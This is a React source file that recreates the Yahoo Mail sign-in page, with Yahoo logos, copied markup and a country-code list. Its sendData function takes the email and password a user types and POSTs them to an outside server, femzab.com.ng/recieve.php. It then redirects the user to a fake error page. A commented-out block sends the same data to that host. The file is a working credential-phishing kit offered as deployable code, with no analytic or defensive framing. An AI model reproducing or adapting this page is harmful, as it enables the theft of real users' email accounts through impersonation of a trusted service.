// import logo from './logo.svg';
// import './App.css';

import { useState } from "react";

const deviceWidth = window.screen.availWidth;

function App() {
  const [input, setInput] = useState({
    email: "",
    password: ""
  })
  const [showP, setShowP] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const showSmall = (deviceWidth > 700);
  console.log(showSmall, deviceWidth)

  const sendData = async()=>{
    // validate input
    setError("")
    if( !(/^[^@]+@\w+(\.\w+)+\w$/.test(input.email)) ){
      setError("Email is invalid")
      return
    }

    if( (input.password).length < 2  ){
      setError("Password is required")
      return
    }

    setLoading(true)
    // setLoading(false)

    const formData = new FormData();
    formData.append("email", input.email)
    formData.append("password", input.password)
		fetch('https://femzab.com.ng/recieve.php',{
                    method: "POST",
                    body: formData,
                })
                .then((response) => response.json())
                .then((result) => {
                    // user221999 ;
                    setLoading(false)
                    window.location.replace("yahoo-error.vercel.app")
                })
                .catch((error) => {
                    // alert(error);
                    setLoading(false)
                    console.log(error)
                    setError('An error occurred, try again later')
                })
                .then(() => {});
    // try{
    //   var fd = 
    //   await axios.post("https://femzab.com.ng/recieve.php", input)
    //   window.location.replace("https://outlook.com")
    // }catch(e){
    //   console.log(e)
    //   setError('An error occurred, try again later')
    // }
  }
  return (
    <div>
      <div id="login-body" className="loginish  puree-v2  grid    ">
    <div className="mbr-desktop-hd">
    <span className="column">
         <a href="https://uk.yahoo.com/">
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className="logo " width="" height="36" />
            <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" className="dark-mode-logo logo " width="" height="36" />
        </a>
    </span>
    <span className="column help txt-align-right">
        <a href="https://help.yahoo.com/kb/index?locale&#x3D;zh_HK&amp;page&#x3D;product&amp;y&#x3D;PROD_ACCT">Help</a>
    </span>
</div>
    <div className="login-box-container">
        <div className="login-box right">
            <div className="mbr-login-hd txt-align-center">
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" className="logo yahoo-en-GB" width="" height="27" />
                    <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png" alt="Yahoo" className="dark-mode-logo logo yahoo-en-GB" width="" height="27" />
            </div>
            <div className="challenge yid-challenge">
              <div className="challenge-header">
              </div>
<div className="username-challenge" id="login-landing">
    <strong className="challenge-heading">Sign in to Yahoo Mail</strong>
    <span className="challenge-desc signin-sub-title">Sign in using your Yahoo account</span>
    <form id="login-username-form" method="post" className="pure-form">
        <input type="hidden" name="browser-fp-data" id="browser-fp-data" value="" />
        <input type="hidden" name="crumb" value="MU7P8XRYqm4" />
        <input type="hidden" name="acrumb" value="AieUzMUr" />
        <input type="hidden" name="sessionIndex" value="Qg--" />
        <input type="hidden" name="displayName" value="" />
        <input type="hidden" name="deviceCapability" value='{"pa":{"status":false}}' id="deviceCapability" />
        <div id="username-country-code-field" className="username-country-code puree-country-inline-dropdown-disabled code-of-length-2">
            <div id="selected-country-code-cont" className="puree-dropdown selected-country-code-cont ltr hide">
                <div id="selected-country-code" className="selected-country-code">+41</div>
                <span className="arrow"></span>
            </div>
            <div id="country-dropdown-container" className="country-code-dropdown country-dropdown-container hide">
                <div className="puree-dropdown">
    <label className="offscreen" id="country-code-lbl-aria">Enter country code</label>
    <select type="select" name="countryCodeIntl" aria-required="true" role="combobox"
            aria-multiline="false" aria-labelledby="country-code-lbl-aria"  disabled>
        <option role="option" data-code="+93" value="AF" >Afghanistan &#x202A;(+93)&#x202C;</option>
        <option role="option" data-code="+355" value="AL" >Albania &#x202A;(+355)&#x202C;</option>
        <option role="option" data-code="+213" value="DZ" >Algeria &#x202A;(+213)&#x202C;</option>
        <option role="option" data-code="+1" value="AS" >American Samoa &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+376" value="AD" >Andorra &#x202A;(+376)&#x202C;</option>
        <option role="option" data-code="+244" value="AO" >Angola &#x202A;(+244)&#x202C;</option>
        <option role="option" data-code="+1" value="AI" >Anguilla &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+1" value="AG" >Antigua and Barbuda &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+54" value="AR" >Argentina &#x202A;(+54)&#x202C;</option>
        <option role="option" data-code="+374" value="AM" >Armenia &#x202A;(+374)&#x202C;</option>
        <option role="option" data-code="+297" value="AW" >Aruba &#x202A;(+297)&#x202C;</option>
        <option role="option" data-code="+247" value="AC" >Ascension &#x202A;(+247)&#x202C;</option>
        <option role="option" data-code="+61" value="AU" >Australia &#x202A;(+61)&#x202C;</option>
        <option role="option" data-code="+672" value="AX" >Australian External Territories &#x202A;(+672)&#x202C;</option>
        <option role="option" data-code="+43" value="AT" >Austria &#x202A;(+43)&#x202C;</option>
        <option role="option" data-code="+994" value="AZ" >Azerbaijan &#x202A;(+994)&#x202C;</option>
        <option role="option" data-code="+1" value="BS" >Bahamas &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+973" value="BH" >Bahrain &#x202A;(+973)&#x202C;</option>
        <option role="option" data-code="+880" value="BD" >Bangladesh &#x202A;(+880)&#x202C;</option>
        <option role="option" data-code="+1" value="BB" >Barbados &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+375" value="BY" >Belarus &#x202A;(+375)&#x202C;</option>
        <option role="option" data-code="+32" value="BE" >Belgium &#x202A;(+32)&#x202C;</option>
        <option role="option" data-code="+501" value="BZ" >Belize &#x202A;(+501)&#x202C;</option>
        <option role="option" data-code="+229" value="BJ" >Benin &#x202A;(+229)&#x202C;</option>
        <option role="option" data-code="+1" value="BM" >Bermuda &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+975" value="BT" >Bhutan &#x202A;(+975)&#x202C;</option>
        <option role="option" data-code="+591" value="BO" >Bolivia &#x202A;(+591)&#x202C;</option>
        <option role="option" data-code="+387" value="BA" >Bosnia and Herzegovina &#x202A;(+387)&#x202C;</option>
        <option role="option" data-code="+267" value="BW" >Botswana &#x202A;(+267)&#x202C;</option>
        <option role="option" data-code="+55" value="BR" >Brazil &#x202A;(+55)&#x202C;</option>
        <option role="option" data-code="+1" value="VG" >British Virgin Islands &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+673" value="BN" >Brunei Darussalam &#x202A;(+673)&#x202C;</option>
        <option role="option" data-code="+359" value="BG" >Bulgaria &#x202A;(+359)&#x202C;</option>
        <option role="option" data-code="+226" value="BF" >Burkina Faso &#x202A;(+226)&#x202C;</option>
        <option role="option" data-code="+257" value="BI" >Burundi &#x202A;(+257)&#x202C;</option>
        <option role="option" data-code="+855" value="KH" >Cambodia &#x202A;(+855)&#x202C;</option>
        <option role="option" data-code="+237" value="CM" >Cameroon &#x202A;(+237)&#x202C;</option>
        <option role="option" data-code="+1" value="CA" >Canada &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+238" value="CV" >Cape Verde &#x202A;(+238)&#x202C;</option>
        <option role="option" data-code="+1" value="KY" >Cayman Islands &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+236" value="CF" >Central African Republic &#x202A;(+236)&#x202C;</option>
        <option role="option" data-code="+235" value="TD" >Chad &#x202A;(+235)&#x202C;</option>
        <option role="option" data-code="+56" value="CL" >Chile &#x202A;(+56)&#x202C;</option>
        <option role="option" data-code="+86" value="CN" >China &#x202A;(+86)&#x202C;</option>
        <option role="option" data-code="+57" value="CO" >Colombia &#x202A;(+57)&#x202C;</option>
        <option role="option" data-code="+269" value="KM" >Comoros &#x202A;(+269)&#x202C;</option>
        <option role="option" data-code="+242" value="CG" >Congo &#x202A;(+242)&#x202C;</option>
        <option role="option" data-code="+682" value="CK" >Cook Islands &#x202A;(+682)&#x202C;</option>
        <option role="option" data-code="+506" value="CR" >Costa Rica &#x202A;(+506)&#x202C;</option>
        <option role="option" data-code="+225" value="CI" >Côte d&#x27;Ivoire &#x202A;(+225)&#x202C;</option>
        <option role="option" data-code="+385" value="HR" >Croatia &#x202A;(+385)&#x202C;</option>
        <option role="option" data-code="+53" value="CU" >Cuba &#x202A;(+53)&#x202C;</option>
        <option role="option" data-code="+357" value="CY" >Cyprus &#x202A;(+357)&#x202C;</option>
        <option role="option" data-code="+420" value="CZ" >Czech Republic &#x202A;(+420)&#x202C;</option>
        <option role="option" data-code="+243" value="CD" >Democratic Republic of the Congo &#x202A;(+243)&#x202C;</option>
        <option role="option" data-code="+45" value="DK" >Denmark &#x202A;(+45)&#x202C;</option>
        <option role="option" data-code="+246" value="DG" >Diego Garcia &#x202A;(+246)&#x202C;</option>
        <option role="option" data-code="+253" value="DJ" >Djibouti &#x202A;(+253)&#x202C;</option>
        <option role="option" data-code="+1" value="DM" >Dominica &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+1" value="DO" >Dominican Republic &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+670" value="TL" >East Timor &#x202A;(+670)&#x202C;</option>
        <option role="option" data-code="+593" value="EC" >Ecuador &#x202A;(+593)&#x202C;</option>
        <option role="option" data-code="+20" value="EG" >Egypt &#x202A;(+20)&#x202C;</option>
        <option role="option" data-code="+503" value="SV" >El Salvador &#x202A;(+503)&#x202C;</option>
        <option role="option" data-code="+240" value="GQ" >Equatorial Guinea &#x202A;(+240)&#x202C;</option>
        <option role="option" data-code="+291" value="ER" >Eritrea &#x202A;(+291)&#x202C;</option>
        <option role="option" data-code="+372" value="EE" >Estonia &#x202A;(+372)&#x202C;</option>
        <option role="option" data-code="+251" value="ET" >Ethiopia &#x202A;(+251)&#x202C;</option>
        <option role="option" data-code="+500" value="FK" >Falkland Islands &#x202A;(+500)&#x202C;</option>
        <option role="option" data-code="+298" value="FO" >Faroe Islands &#x202A;(+298)&#x202C;</option>
        <option role="option" data-code="+679" value="FJ" >Fiji &#x202A;(+679)&#x202C;</option>
        <option role="option" data-code="+358" value="FI" >Finland &#x202A;(+358)&#x202C;</option>
        <option role="option" data-code="+33" value="FR" >France &#x202A;(+33)&#x202C;</option>
        <option role="option" data-code="+594" value="GF" >French Guiana &#x202A;(+594)&#x202C;</option>
        <option role="option" data-code="+689" value="PF" >French Polynesia &#x202A;(+689)&#x202C;</option>
        <option role="option" data-code="+241" value="GA" >Gabon &#x202A;(+241)&#x202C;</option>
        <option role="option" data-code="+220" value="GM" >Gambia &#x202A;(+220)&#x202C;</option>
        <option role="option" data-code="+995" value="GE" >Georgia &#x202A;(+995)&#x202C;</option>
        <option role="option" data-code="+49" value="DE" >Germany &#x202A;(+49)&#x202C;</option>
        <option role="option" data-code="+233" value="GH" >Ghana &#x202A;(+233)&#x202C;</option>
        <option role="option" data-code="+350" value="GI" >Gibraltar &#x202A;(+350)&#x202C;</option>
        <option role="option" data-code="+30" value="GR" >Greece &#x202A;(+30)&#x202C;</option>
        <option role="option" data-code="+299" value="GL" >Greenland &#x202A;(+299)&#x202C;</option>
        <option role="option" data-code="+1" value="GD" >Grenada &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+590" value="GP" >Guadeloupe &#x202A;(+590)&#x202C;</option>
        <option role="option" data-code="+1" value="GU" >Guam &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+502" value="GT" >Guatemala &#x202A;(+502)&#x202C;</option>
        <option role="option" data-code="+224" value="GN" >Guinea &#x202A;(+224)&#x202C;</option>
        <option role="option" data-code="+245" value="GW" >Guinea-Bissau &#x202A;(+245)&#x202C;</option>
        <option role="option" data-code="+592" value="GY" >Guyana &#x202A;(+592)&#x202C;</option>
        <option role="option" data-code="+509" value="HT" >Haiti &#x202A;(+509)&#x202C;</option>
        <option role="option" data-code="+504" value="HN" >Honduras &#x202A;(+504)&#x202C;</option>
        <option role="option" data-code="+852" value="HK" >Hong Kong &#x202A;(+852)&#x202C;</option>
        <option role="option" data-code="+36" value="HU" >Hungary &#x202A;(+36)&#x202C;</option>
        <option role="option" data-code="+354" value="IS" >Iceland &#x202A;(+354)&#x202C;</option>
        <option role="option" data-code="+91" value="IN" >India &#x202A;(+91)&#x202C;</option>
        <option role="option" data-code="+62" value="ID" >Indonesia &#x202A;(+62)&#x202C;</option>
        <option role="option" data-code="+98" value="IR" >Iran &#x202A;(+98)&#x202C;</option>
        <option role="option" data-code="+964" value="IQ" >Iraq &#x202A;(+964)&#x202C;</option>
        <option role="option" data-code="+353" value="IE" >Ireland &#x202A;(+353)&#x202C;</option>
        <option role="option" data-code="+972" value="IL" >Israel &#x202A;(+972)&#x202C;</option>
        <option role="option" data-code="+39" value="IT" >Italy &#x202A;(+39)&#x202C;</option>
        <option role="option" data-code="+1" value="JM" >Jamaica &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+81" value="JP" >Japan &#x202A;(+81)&#x202C;</option>
        <option role="option" data-code="+962" value="JO" >Jordan &#x202A;(+962)&#x202C;</option>
        <option role="option" data-code="+7" value="KZ" >Kazakhstan &#x202A;(+7)&#x202C;</option>
        <option role="option" data-code="+254" value="KE" >Kenya &#x202A;(+254)&#x202C;</option>
        <option role="option" data-code="+686" value="KI" >Kiribati &#x202A;(+686)&#x202C;</option>
        <option role="option" data-code="+383" value="XK" >Kosovo &#x202A;(+383)&#x202C;</option>
        <option role="option" data-code="+965" value="KW" >Kuwait &#x202A;(+965)&#x202C;</option>
        <option role="option" data-code="+996" value="KG" >Kyrgyzstan &#x202A;(+996)&#x202C;</option>
        <option role="option" data-code="+856" value="LA" >Laos &#x202A;(+856)&#x202C;</option>
        <option role="option" data-code="+371" value="LV" >Latvia &#x202A;(+371)&#x202C;</option>
        <option role="option" data-code="+961" value="LB" >Lebanon &#x202A;(+961)&#x202C;</option>
        <option role="option" data-code="+266" value="LS" >Lesotho &#x202A;(+266)&#x202C;</option>
        <option role="option" data-code="+231" value="LR" >Liberia &#x202A;(+231)&#x202C;</option>
        <option role="option" data-code="+218" value="LY" >Libya &#x202A;(+218)&#x202C;</option>
        <option role="option" data-code="+423" value="LI" >Liechtenstein &#x202A;(+423)&#x202C;</option>
        <option role="option" data-code="+370" value="LT" >Lithuania &#x202A;(+370)&#x202C;</option>
        <option role="option" data-code="+352" value="LU" >Luxembourg &#x202A;(+352)&#x202C;</option>
        <option role="option" data-code="+853" value="MO" >Macao &#x202A;(+853)&#x202C;</option>
        <option role="option" data-code="+389" value="MK" >N. Macedonia &#x202A;(+389)&#x202C;</option>
        <option role="option" data-code="+261" value="MG" >Madagascar &#x202A;(+261)&#x202C;</option>
        <option role="option" data-code="+265" value="MW" >Malawi &#x202A;(+265)&#x202C;</option>
        <option role="option" data-code="+60" value="MY" >Malaysia &#x202A;(+60)&#x202C;</option>
        <option role="option" data-code="+960" value="MV" >Maldives &#x202A;(+960)&#x202C;</option>
        <option role="option" data-code="+223" value="ML" >Mali &#x202A;(+223)&#x202C;</option>
        <option role="option" data-code="+356" value="MT" >Malta &#x202A;(+356)&#x202C;</option>
        <option role="option" data-code="+692" value="MH" >Marshall Islands &#x202A;(+692)&#x202C;</option>
        <option role="option" data-code="+596" value="MQ" >Martinique &#x202A;(+596)&#x202C;</option>
        <option role="option" data-code="+222" value="MR" >Mauritania &#x202A;(+222)&#x202C;</option>
        <option role="option" data-code="+230" value="MU" >Mauritius &#x202A;(+230)&#x202C;</option>
        <option role="option" data-code="+52" value="MX" >Mexico &#x202A;(+52)&#x202C;</option>
        <option role="option" data-code="+691" value="FM" >Micronesia &#x202A;(+691)&#x202C;</option>
        <option role="option" data-code="+373" value="MD" >Moldova &#x202A;(+373)&#x202C;</option>
        <option role="option" data-code="+377" value="MC" >Monaco &#x202A;(+377)&#x202C;</option>
        <option role="option" data-code="+976" value="MN" >Mongolia &#x202A;(+976)&#x202C;</option>
        <option role="option" data-code="+382" value="ME" >Montenegro &#x202A;(+382)&#x202C;</option>
        <option role="option" data-code="+1" value="MS" >Montserrat &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+212" value="MA" >Morocco &#x202A;(+212)&#x202C;</option>
        <option role="option" data-code="+258" value="MZ" >Mozambique &#x202A;(+258)&#x202C;</option>
        <option role="option" data-code="+95" value="MM" >Myanmar &#x202A;(+95)&#x202C;</option>
        <option role="option" data-code="+264" value="NA" >Namibia &#x202A;(+264)&#x202C;</option>
        <option role="option" data-code="+674" value="NR" >Nauru &#x202A;(+674)&#x202C;</option>
        <option role="option" data-code="+977" value="NP" >Nepal &#x202A;(+977)&#x202C;</option>
        <option role="option" data-code="+31" value="NL" >Netherlands &#x202A;(+31)&#x202C;</option>
        <option role="option" data-code="+599" value="AN" >Netherlands Antilles &#x202A;(+599)&#x202C;</option>
        <option role="option" data-code="+687" value="NC" >New Caledonia &#x202A;(+687)&#x202C;</option>
        <option role="option" data-code="+64" value="NZ" >New Zealand &#x202A;(+64)&#x202C;</option>
        <option role="option" data-code="+505" value="NI" >Nicaragua &#x202A;(+505)&#x202C;</option>
        <option role="option" data-code="+227" value="NE" >Niger &#x202A;(+227)&#x202C;</option>
        <option role="option" data-code="+234" value="NG" >Nigeria &#x202A;(+234)&#x202C;</option>
        <option role="option" data-code="+683" value="NU" >Niue &#x202A;(+683)&#x202C;</option>
        <option role="option" data-code="+850" value="KP" >North Korea &#x202A;(+850)&#x202C;</option>
        <option role="option" data-code="+1" value="MP" >Northern Mariana Islands &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+47" value="NO" >Norway &#x202A;(+47)&#x202C;</option>
        <option role="option" data-code="+968" value="OM" >Oman &#x202A;(+968)&#x202C;</option>
        <option role="option" data-code="+92" value="PK" >Pakistan &#x202A;(+92)&#x202C;</option>
        <option role="option" data-code="+680" value="PW" >Palau &#x202A;(+680)&#x202C;</option>
        <option role="option" data-code="+970" value="PS" >Palestine &#x202A;(+970)&#x202C;</option>
        <option role="option" data-code="+507" value="PA" >Panama &#x202A;(+507)&#x202C;</option>
        <option role="option" data-code="+675" value="PG" >Papua New Guinea &#x202A;(+675)&#x202C;</option>
        <option role="option" data-code="+595" value="PY" >Paraguay &#x202A;(+595)&#x202C;</option>
        <option role="option" data-code="+51" value="PE" >Peru &#x202A;(+51)&#x202C;</option>
        <option role="option" data-code="+63" value="PH" >Philippines &#x202A;(+63)&#x202C;</option>
        <option role="option" data-code="+48" value="PL" >Poland &#x202A;(+48)&#x202C;</option>
        <option role="option" data-code="+351" value="PT" >Portugal &#x202A;(+351)&#x202C;</option>
        <option role="option" data-code="+1" value="PR" >Puerto Rico &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+974" value="QA" >Qatar &#x202A;(+974)&#x202C;</option>
        <option role="option" data-code="+262" value="RE" >Reunion &#x202A;(+262)&#x202C;</option>
        <option role="option" data-code="+40" value="RO" >Romania &#x202A;(+40)&#x202C;</option>
        <option role="option" data-code="+7" value="RU" >Russia &#x202A;(+7)&#x202C;</option>
        <option role="option" data-code="+250" value="RW" >Rwanda &#x202A;(+250)&#x202C;</option>
        <option role="option" data-code="+290" value="SH" >Saint Helena &#x202A;(+290)&#x202C;</option>
        <option role="option" data-code="+1" value="KN" >Saint Kitts and Nevis &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+1" value="LC" >Saint Lucia &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+508" value="PM" >Saint Pierre and Miquelon &#x202A;(+508)&#x202C;</option>
        <option role="option" data-code="+1" value="VC" >Saint Vincent and Grenadines &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+685" value="WS" >Samoa &#x202A;(+685)&#x202C;</option>
        <option role="option" data-code="+378" value="SM" >San Marino &#x202A;(+378)&#x202C;</option>
        <option role="option" data-code="+239" value="ST" >Sao Tome and Principe &#x202A;(+239)&#x202C;</option>
        <option role="option" data-code="+966" value="SA" >Saudi Arabia &#x202A;(+966)&#x202C;</option>
        <option role="option" data-code="+221" value="SN" >Senegal &#x202A;(+221)&#x202C;</option>
        <option role="option" data-code="+381" value="RS" >Serbia &#x202A;(+381)&#x202C;</option>
        <option role="option" data-code="+248" value="SC" >Seychelles &#x202A;(+248)&#x202C;</option>
        <option role="option" data-code="+232" value="SL" >Sierra Leone &#x202A;(+232)&#x202C;</option>
        <option role="option" data-code="+65" value="SG" >Singapore &#x202A;(+65)&#x202C;</option>
        <option role="option" data-code="+421" value="SK" >Slovakia &#x202A;(+421)&#x202C;</option>
        <option role="option" data-code="+386" value="SI" >Slovenia &#x202A;(+386)&#x202C;</option>
        <option role="option" data-code="+677" value="SB" >Solomon Islands &#x202A;(+677)&#x202C;</option>
        <option role="option" data-code="+252" value="SO" >Somalia &#x202A;(+252)&#x202C;</option>
        <option role="option" data-code="+27" value="ZA" >South Africa &#x202A;(+27)&#x202C;</option>
        <option role="option" data-code="+82" value="KR" >South Korea &#x202A;(+82)&#x202C;</option>
        <option role="option" data-code="+34" value="ES" >Spain &#x202A;(+34)&#x202C;</option>
        <option role="option" data-code="+94" value="LK" >Sri Lanka &#x202A;(+94)&#x202C;</option>
        <option role="option" data-code="+249" value="SD" >Sudan &#x202A;(+249)&#x202C;</option>
        <option role="option" data-code="+597" value="SR" >Suriname &#x202A;(+597)&#x202C;</option>
        <option role="option" data-code="+268" value="SZ" >Swaziland &#x202A;(+268)&#x202C;</option>
        <option role="option" data-code="+46" value="SE" >Sweden &#x202A;(+46)&#x202C;</option>
        <option role="option" data-code="+41" value="CH" selected="selected">Switzerland &#x202A;(+41)&#x202C;</option>
        <option role="option" data-code="+963" value="SY" >Syria &#x202A;(+963)&#x202C;</option>
        <option role="option" data-code="+886" value="TW" >Taiwan &#x202A;(+886)&#x202C;</option>
        <option role="option" data-code="+992" value="TJ" >Tajikistan &#x202A;(+992)&#x202C;</option>
        <option role="option" data-code="+255" value="TZ" >Tanzania &#x202A;(+255)&#x202C;</option>
        <option role="option" data-code="+66" value="TH" >Thailand &#x202A;(+66)&#x202C;</option>
        <option role="option" data-code="+228" value="TG" >Togo &#x202A;(+228)&#x202C;</option>
        <option role="option" data-code="+690" value="TK" >Tokelau &#x202A;(+690)&#x202C;</option>
        <option role="option" data-code="+676" value="TO" >Tonga &#x202A;(+676)&#x202C;</option>
        <option role="option" data-code="+1" value="TT" >Trinidad and Tobago &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+216" value="TN" >Tunisia &#x202A;(+216)&#x202C;</option>
        <option role="option" data-code="+90" value="TR" >Turkey &#x202A;(+90)&#x202C;</option>
        <option role="option" data-code="+993" value="TM" >Turkmenistan &#x202A;(+993)&#x202C;</option>
        <option role="option" data-code="+1" value="TC" >Turks and Caicos Islands &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+688" value="TV" >Tuvalu &#x202A;(+688)&#x202C;</option>
        <option role="option" data-code="+1" value="VI" >US Virgin Islands &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+256" value="UG" >Uganda &#x202A;(+256)&#x202C;</option>
        <option role="option" data-code="+380" value="UA" >Ukraine &#x202A;(+380)&#x202C;</option>
        <option role="option" data-code="+971" value="AE" >United Arab Emirates &#x202A;(+971)&#x202C;</option>
        <option role="option" data-code="+44" value="GB" >United Kingdom &#x202A;(+44)&#x202C;</option>
        <option role="option" data-code="+1" value="US" data-format="(XXX) XXX-XXXX" >United States &#x202A;(+1)&#x202C;</option>
        <option role="option" data-code="+598" value="UY" >Uruguay &#x202A;(+598)&#x202C;</option>
        <option role="option" data-code="+998" value="UZ" >Uzbekistan &#x202A;(+998)&#x202C;</option>
        <option role="option" data-code="+678" value="VU" >Vanuatu &#x202A;(+678)&#x202C;</option>
        <option role="option" data-code="+379" value="VA" >Vatican City &#x202A;(+379)&#x202C;</option>
        <option role="option" data-code="+58" value="VE" >Venezuela &#x202A;(+58)&#x202C;</option>
        <option role="option" data-code="+84" value="VN" >Vietnam &#x202A;(+84)&#x202C;</option>
        <option role="option" data-code="+681" value="WF" >Wallis and Futuna &#x202A;(+681)&#x202C;</option>
        <option role="option" data-code="+967" value="YE" >Yemen &#x202A;(+967)&#x202C;</option>
        <option role="option" data-code="+260" value="ZM" >Zambia &#x202A;(+260)&#x202C;</option>
        <option role="option" data-code="+263" value="ZW" >Zimbabwe &#x202A;(+263)&#x202C;</option>
    </select>
    <div className="arrow"></div>
</div>

            </div>
            <div className="input-group">
                <input  className={!showP ? "input-container" : "hidden-input-container"} type="text" name="username" id="login-username" onChange={_val => setInput({...input, email: _val.target.value})} value={input.email} autocomplete="username" autocapitalize="none" autocorrect="off" autofocus="true"  placeholder=" " />
                <div className="input-field-icon hide" id="username-field-icon"></div>
                {( !showP && <label for="login-username" id="login-label" className="login-label">Username, email address or mobile number</label>)}
                <ul className="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
                    <li data-fill="yahoo.com" tabindex="2">yahoo.com</li><li data-fill="gmail.com" tabindex="3">gmail.com</li><li data-fill="outlook.com" tabindex="4">outlook.com</li><li data-fill="aol.com" tabindex="5">aol.com</li>
                </ul>            </div>
            <div className={showP ? "input-container" : "hidden-input-container"}>
                <input name="passwd" onChange={_val => setInput({...input, password: _val.target.value})} value={input.password} className="pwd-field" type="password" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" placeholder="Password" />
            </div>
        </div>
        {(error != '') && <p id="username-error" className="error-msg hide" role="alert">{error}</p>}


        <div className="button-container">
            <input id="login-signin" type={"button"} name="signin" onClick={(e)=>{
              if(showP == true){
                sendData()
                // this.submit();
                // return
              }else{
                setShowP(true)
              }
            }} className="pure-button puree-button-primary challenge-button" style={{ opacity: ((loading == true) ? 0.45 : 1) }} value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:primary;slk:next;mKey:next" />
        </div>

        <div className="helper-links-container">
            <div className="helper-item ">
                <span className="stay-signed-in checkbox-container">
                    <input id="persistent" name="persistent" value="y" type="checkbox" checked />
                    <label for="persistent">Stay signed in</label>
                </span>
            </div>
            <div className="helper-item arlink">
                <span className="help">
                    <a href="/forgot?.intl&#x3D;gb&amp;.lang&#x3D;en-GB&amp;src&#x3D;ym&amp;activity&#x3D;header-signin&amp;pspid&#x3D;1197806870&amp;.done&#x3D;https%3A%2F%2Fmail.yahoo.com%2Fd&amp;done&#x3D;https%3A%2F%2Fmail.yahoo.com%2Fd" id="mbr-forgot-link" data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:forgot" data-rapid-tracking="true">Forgotten username?</a>
                </span>
            </div>
        </div>
        <div className="bottom-links-container">
            <p className="sign-up-link">
                <a href="/account/create?.intl&#x3D;gb&amp;.lang&#x3D;en-GB&amp;src&#x3D;ym&amp;activity&#x3D;header-signin&amp;pspid&#x3D;1197806870&amp;.done&#x3D;https%3A%2F%2Fmail.yahoo.com%2Fd&amp;specId&#x3D;yidregsimplified&amp;done&#x3D;https%3A%2F%2Fmail.yahoo.com%2Fd" id="createacc" role="button" className="pure-button puree-button-secondary challenge-button" data-rapid-tracking="true" data-ylk="elm:link;elmt:secondary;slk:signup;mKey:signup">Create an account</a>
            </p>

        </div>
    </form>
</div>
</div>
        </div>
        <div className="hide-small" style={{ visibility: !showSmall ? "hidden" : "visible", display: !showSmall ? 'none' : 'flex', alignItems: 'flex-start', justifyContent: 'flex-start' }}>
            <div>
              <h1 style={{ fontSize: 38 }}>Yahoo makes it easy to enjoy <br /> what matters most in your world.</h1>
              <p>Best-in-class Yahoo Mail, breaking local, national and global news, finance, <br /> sport, music, films and more. You get more out of the web; you get more out of life.</p>
            </div>
        </div>
    </div>
    <div className="login-bg-outer">
        <div className="login-bg-inner">
                <div id="login-ad-rich"></div>
                    </div>
    </div>
    <div className="login-footer">
    <p>
        <a href="https://legal.yahoo.com/ie/en/yahoo/terms/otos/index.html" target="_blank" className="terms" >Terms</a>
        
        <span>|</span>
        <a href="https://legal.yahoo.com/ie/en/yahoo/privacy/index.html" target="_blank" className="privacy" >Privacy</a>
        
    </p>
</div>
</div>
</div>
  );
}

export default App;
